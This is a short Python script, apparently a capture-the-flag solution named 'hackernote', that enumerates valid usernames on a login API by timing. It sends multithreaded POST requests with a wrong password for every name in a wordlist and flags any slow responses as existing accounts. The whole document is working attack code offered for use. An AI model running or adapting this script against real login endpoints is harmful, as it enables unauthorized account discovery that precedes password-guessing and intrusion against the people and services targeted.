#python3 hackernote_optimized.py wordlist.txt http://ip/api/user/login
import requests as r
import time
import sys
import threading
import queue

q = queue.Queue(maxsize=64)
inputFile = sys.argv[1]
URL = sys.argv[2]
validUsers = []

def Login():
    while True:
        user = q.get()
        creds = {"username":user,"password":"InvalidPassword"}
        startRequest = time.time()
        request = r.post(URL, json=creds)
        endRequest = time.time()
        if endRequest-startRequest > 1:
            validUsers.append(user)
        q.task_done()
        
threads = []
for i in range(1,64):
    t = threading.Thread(target=Login, daemon=True).start()
    threads.append(t)

wordlist = open(inputFile, "r").read().splitlines() 

for username in wordlist:
    print(username)
    q.put(username)

q.join()
print("Valid users: ", validUsers)